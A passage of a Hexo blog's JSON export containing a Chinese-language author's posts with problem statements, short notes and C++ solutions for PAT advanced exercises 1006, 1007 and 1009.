cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> m;</div><div class=\"line\"><span class=\"built_in\">string</span> first;</div><div class=\"line\"><span class=\"built_in\">string</span> last;</div><div class=\"line\"><span class=\"built_in\">string</span> id;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> id</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> h, m, s;</div><div class=\"line\">&#125;maxi, mini, tmp;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m;i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; id;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d:%d:%d\"</span>, &amp;tmp.h, &amp;tmp.m, &amp;tmp.s);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!i || (tmp.h == mini.h ? tmp.m == mini.m ? tmp.s &lt; mini.s : tmp.m &lt; mini.m : tmp.h &lt; mini.h))</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tmini = tmp; first = id;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d:%d:%d\"</span>, &amp;tmp.h, &amp;tmp.m, &amp;tmp.s);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!i || (tmp.h == maxi.h ? tmp.m == maxi.m ? tmp.s &gt; maxi.s : tmp.m &gt; maxi.m : tmp.h &gt; maxi.h))</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tmaxi = tmp; last = id;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; first &lt;&lt; <span class=\"string\">\" \"</span> &lt;&lt; last &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1006.Sign In and Sign Out (25)</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case contains the records for one day. The case starts with a positive integer M, which is the total number of records, followed by M lines, each in the format:</p>\n<p>ID_number Sign_in_time Sign_out_time<br>where times are given in the format HH:MM:SS, and ID number is a string with no more than 15 characters.</p>\n<p>Output Specification:</p>\n<p>For each test case, output in one line the ID numbers of the persons who have unlocked and locked the door on that day. The two ID numbers must be separated by one space.</p>\n<p>Note: It is guaranteed that the records are consistent. That is, the sign in time must be earlier than the sign out time for each person, and there are no two persons sign in or out at the same moment.</p>\n<p>Sample Input:<br>3<br>CS301111 15:30:28 17:00:10<br>SC3021234 08:00:00 11:25:25<br>CS301133 21:45:00 21:58:40</p>\n<p>Sample Output:<br>SC3021234 CS301133</p>\n</blockquote>\n<p>被自己蠢到了。开锁和上锁的输出顺序弄错了，瞎忙活了一个小时。</p>\n<p><code>cin</code>遇到<code>Space</code>,<code>Tab</code>,<code>Enter</code>会结束读取。</p>\n<p><code>||</code>优先级比<code>?</code>，长逻辑不确定记得加<code>()</code></p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> m;</div><div class=\"line\"><span class=\"built_in\">string</span> first;</div><div class=\"line\"><span class=\"built_in\">string</span> last;</div><div class=\"line\"><span class=\"built_in\">string</span> id;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> id</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> h, m, s;</div><div class=\"line\">&#125;maxi, mini, tmp;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m;i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; id;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d:%d:%d\"</span>, &amp;tmp.h, &amp;tmp.m, &amp;tmp.s);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!i || (tmp.h == mini.h ? tmp.m == mini.m ? tmp.s &lt; mini.s : tmp.m &lt; mini.m : tmp.h &lt; mini.h))</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tmini = tmp; first = id;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d:%d:%d\"</span>, &amp;tmp.h, &amp;tmp.m, &amp;tmp.s);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!i || (tmp.h == maxi.h ? tmp.m == maxi.m ? tmp.s &gt; maxi.s : tmp.m &gt; maxi.m : tmp.h &gt; maxi.h))</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tmaxi = tmp; last = id;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; first &lt;&lt; <span class=\"string\">\" \"</span> &lt;&lt; last &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1007","date":"2017-02-09T11:01:40.000Z","_content":"\n## Description\n\n> 1007.Maximum Subsequence Sum (25)\n\n> Given a sequence of K integers { N1, N2, ..., NK }. A continuous subsequence is defined to be { Ni, Ni+1, ..., Nj } where 1 <= i <= j <= K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20.\n\n> Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case occupies two lines. The first line contains a positive integer K (<= 10000). The second line contains K numbers, separated by a space.\n\n> Output Specification:\n\n> For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence.\n\n> Sample Input:\n10\n-10 1 2 3 4 -5 -23 3 7 -21\n\n>Sample Output:\n10 1 4\n\n第一次超时了O(n^3)，后来改成O(n^2)了。\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\n\nconst int maxN = 1e4 + 10;\n\nint q[maxN];\nint n;\nint tmp;\nint flag = 0;\nint ans = numeric_limits<int>::min();\nint f, l;\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t\tcin >> q[i];\n\tfor (flag = 0; flag < n && q[flag] < 0; flag++);\n\tif (flag == n )\n\t{\n\t\tcout << 0 << ' ' << q[0] << ' ' << q[n - 1];\n\t\treturn 0;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint sum = 0;\n\t\tfor (int j = i; j < n; j++)\n\t\t{\n\t\t\tif ((sum += q[j]) > ans)\n\t\t\t{\n\t\t\t\tans = sum;\n\t\t\t\tf = q[i];\n\t\t\t\tl = q[j];\n\t\t\t}\n\t\t}\n\t}\n\tcout << ans << ' ' << f << ' ' << l;\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1007.md","raw":"---\ntitle: PAT advanced 1007\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-09 19:01:40\n---\n\n## Description\n\n> 1007.Maximum Subsequence Sum (25)\n\n> Given a sequence of K integers { N1, N2, ..., NK }. A continuous subsequence is defined to be { Ni, Ni+1, ..., Nj } where 1 <= i <= j <= K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20.\n\n> Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case occupies two lines. The first line contains a positive integer K (<= 10000). The second line contains K numbers, separated by a space.\n\n> Output Specification:\n\n> For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence.\n\n> Sample Input:\n10\n-10 1 2 3 4 -5 -23 3 7 -21\n\n>Sample Output:\n10 1 4\n\n第一次超时了O(n^3)，后来改成O(n^2)了。\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\n\nconst int maxN = 1e4 + 10;\n\nint q[maxN];\nint n;\nint tmp;\nint flag = 0;\nint ans = numeric_limits<int>::min();\nint f, l;\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t\tcin >> q[i];\n\tfor (flag = 0; flag < n && q[flag] < 0; flag++);\n\tif (flag == n )\n\t{\n\t\tcout << 0 << ' ' << q[0] << ' ' << q[n - 1];\n\t\treturn 0;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint sum = 0;\n\t\tfor (int j = i; j < n; j++)\n\t\t{\n\t\t\tif ((sum += q[j]) > ans)\n\t\t\t{\n\t\t\t\tans = sum;\n\t\t\t\tf = q[i];\n\t\t\t\tl = q[j];\n\t\t\t}\n\t\t}\n\t}\n\tcout << ans << ' ' << f << ' ' << l;\n\treturn 0;\n}\n```","slug":"PAT-advanced-1007","published":1,"updated":"2017-02-09T11:05:07.730Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzq001xhv18s7l7zbm9","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1007.Maximum Subsequence Sum (25)</p>\n<p>Given a sequence of K integers { N1, N2, …, NK }. A continuous subsequence is defined to be { Ni, Ni+1, …, Nj } where 1 &lt;= i &lt;= j &lt;= K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20.</p>\n<p>Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case occupies two lines. The first line contains a positive integer K (&lt;= 10000). The second line contains K numbers, separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence.</p>\n<p>Sample Input:<br>10<br>-10 1 2 3 4 -5 -23 3 7 -21</p>\n<p>Sample Output:<br>10 1 4</p>\n</blockquote>\n<p>第一次超时了O(n^3)，后来改成O(n^2)了。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#include &lt;cstdio&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;queue&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;vector&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;cstring&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;string&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;iostream&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;algorithm&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;climits&gt;</span></div><div class=\"line\"></div><div class=\"line\">using namespace std;</div><div class=\"line\"></div><div class=\"line\">const <span class=\"keyword\">int</span> maxN = <span class=\"number\">1</span>e4 + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"string\">q[maxN]</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> tmp;</div><div class=\"line\"><span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> ans = numeric_limits&lt;<span class=\"keyword\">int</span>&gt;::min();</div><div class=\"line\"><span class=\"keyword\">int</span> f, l;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tcin &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\tcin &gt;&gt; <span class=\"string\">q[i]</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (flag = <span class=\"number\">0</span>; flag &lt; n &amp;&amp; <span class=\"string\">q[flag]</span> &lt; <span class=\"number\">0</span>; flag++);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (flag == n )</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tcout &lt;&lt; <span class=\"number\">0</span> &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; <span class=\"string\">q[0]</span> &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; <span class=\"string\">q[n - 1]</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i; j &lt; n; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> ((sum += <span class=\"string\">q[j]</span>) &gt; ans)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans = sum;</div><div class=\"line\">\t\t\t\tf = <span class=\"string\">q[i]</span>;</div><div class=\"line\">\t\t\t\tl = <span class=\"string\">q[j]</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tcout &lt;&lt; ans &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; f &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; l;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1007.Maximum Subsequence Sum (25)</p>\n<p>Given a sequence of K integers { N1, N2, …, NK }. A continuous subsequence is defined to be { Ni, Ni+1, …, Nj } where 1 &lt;= i &lt;= j &lt;= K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20.</p>\n<p>Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case occupies two lines. The first line contains a positive integer K (&lt;= 10000). The second line contains K numbers, separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence.</p>\n<p>Sample Input:<br>10<br>-10 1 2 3 4 -5 -23 3 7 -21</p>\n<p>Sample Output:<br>10 1 4</p>\n</blockquote>\n<p>第一次超时了O(n^3)，后来改成O(n^2)了。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#include &lt;cstdio&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;queue&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;vector&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;cstring&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;string&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;iostream&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;algorithm&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;climits&gt;</span></div><div class=\"line\"></div><div class=\"line\">using namespace std;</div><div class=\"line\"></div><div class=\"line\">const <span class=\"keyword\">int</span> maxN = <span class=\"number\">1</span>e4 + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"string\">q[maxN]</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> tmp;</div><div class=\"line\"><span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> ans = numeric_limits&lt;<span class=\"keyword\">int</span>&gt;::min();</div><div class=\"line\"><span class=\"keyword\">int</span> f, l;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tcin &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\tcin &gt;&gt; <span class=\"string\">q[i]</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (flag = <span class=\"number\">0</span>; flag &lt; n &amp;&amp; <span class=\"string\">q[flag]</span> &lt; <span class=\"number\">0</span>; flag++);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (flag == n )</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tcout &lt;&lt; <span class=\"number\">0</span> &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; <span class=\"string\">q[0]</span> &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; <span class=\"string\">q[n - 1]</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i; j &lt; n; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> ((sum += <span class=\"string\">q[j]</span>) &gt; ans)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans = sum;</div><div class=\"line\">\t\t\t\tf = <span class=\"string\">q[i]</span>;</div><div class=\"line\">\t\t\t\tl = <span class=\"string\">q[j]</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tcout &lt;&lt; ans &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; f &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; l;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1009","date":"2017-02-09T14:20:20.000Z","_content":"\n## Description\n\n> 1009.Product of Polynomials (25)\n\n> Input Specification:\n\n> Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 ... NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, ..., K) are the exponents and coefficients, respectively. It is given that 1 <= K <= 10, 0 <= NK < ... < N2 < N1 <=1000.\n\n> Output Specification:\n\n> For each test case you should output the product of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate up to 1 decimal place.\n\n> Sample Input\n2 1 2.4 0 3.2\n2 2 1.5 1 0.5\n\n> Sample Output\n3 3 3.6 2 6.0 1 1.6\n\n居然一次过了。\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e3 + 10;\nfloat ans[maxN + maxN];\nfloat p1[maxN];\nfloat p2[maxN];\nint k1, k2, k3;\n\nint main()\n{\n\tcin >> k1;\n\twhile (k1--)\n\t{\n\t\tint x; cin >> x; cin >> p1[x];\n\t}\n\tcin >> k2;\n\twhile (k2--)\n\t{\n\t\tint x; cin >> x; cin >> p2[x];\n\t}\n\tfor (int i = 0; i < maxN; i++)\n\t{\n\t\tif (p2[i])\n\t\t\tfor (int j = 0; j < maxN; j++)\n\t\t\t{\n\t\t\t\tif (p1[j])\n\t\t\t\t\tans[i + j] += p1[j] * p2[i];\n\t\t\t}\n\t}\n\tfor (int i = 0; i < 2 * maxN; i++)\n\t\tif (ans[i])\n\t\t\tk3++;\n\tcout << k3;\n\tfor (int i = 2 * maxN - 1; i >= 0; i--)\n\t{\n\t\tif (ans[i])\n\t\t\tprintf(\" %d %.1f\", i, ans[i]);\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1009.md","raw":"---\ntitle: PAT advanced 1009\ntags:\n  - 